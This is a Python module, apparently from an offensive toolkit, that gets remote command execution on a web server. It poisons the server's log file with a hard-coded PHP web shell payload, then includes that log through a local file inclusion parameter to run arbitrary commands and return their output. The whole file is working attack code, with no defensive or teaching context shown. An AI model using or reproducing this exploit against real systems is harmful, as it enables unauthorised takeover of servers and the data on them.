"""
Command executor for running commands via poisoned logs.
Follows Single Responsibility Principle.
"""

import urllib.parse
from typing import Optional

from http_client import HttpClient
from poisoning_strategies import PoisoningStrategy
from output_parser import OutputParser
from config import Config


class CommandExecutor:
    """Executes commands via poisoned log files."""
    
    def __init__(
        self,
        http_client: HttpClient,
        strategy: PoisoningStrategy,
        target_url: str,
        param: str,
        log_path: str,
        config: Config
    ):
        """
        Initialize command executor.
        
        Args:
            http_client: HTTP client for making requests
            strategy: Poisoning strategy to use
            target_url: Base target URL
            param: LFI parameter name
            log_path: Path to the poisoned log file
            config: Application configuration
        """
        self.http_client = http_client
        self.strategy = strategy
        self.target_url = target_url
        self.param = param
        self.log_path = log_path
        self.config = config
        self.payload = '<?php system($_GET["cmd"]); ?>'
    
    def execute(self, command: str) -> Optional[str]:
        """
        Execute a command via the poisoned log.
        
        Args:
            command: Command to execute
            
        Returns:
            Command output or None on failure
        """
        # Re-poison the log before each command
        if not self.strategy.poison(self.target_url, self.param, self.log_path, self.payload):
            return "Failed to re-poison log"
        
        # Build execution URL
        encoded_cmd = urllib.parse.quote(command)
        exec_url = f"{self.target_url}?{self.param}={self.log_path}&cmd={encoded_cmd}"
        
        # Execute with default User-Agent
        headers = {'User-Agent': self.config.default_user_agent}
        
        try:
            response = self.http_client.get(exec_url, headers=headers)
            
            if response.status_code == 200:
                return OutputParser.parse(
                    response.text,
                    command,
                    self.config.max_output_lines
                )
            else:
                return f"Request failed with status: {response.status_code}"
                
        except Exception as e:
            return f"Error executing command: {str(e)}"
